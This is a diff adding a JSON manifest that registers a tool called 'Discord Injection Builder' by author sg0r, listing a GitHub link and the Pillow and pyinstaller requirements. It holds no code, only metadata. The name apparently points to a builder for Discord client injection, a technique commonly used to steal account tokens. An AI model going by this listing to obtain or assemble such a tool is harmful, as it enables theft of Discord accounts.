@@ -1,0 +1,9 @@
+{
+    "buildware" : "2.0",
+    "name"      : "Discord Injection Builder",
+    "author"    : "sg0r",
+    "category"  : "Discord",
+    "version"   : "1.0",
+    "github"    : "https://github.com/sg0r/Discord-Injection-Builder",
+    "requires"  : ["Pillow", "pyinstaller"]
+}
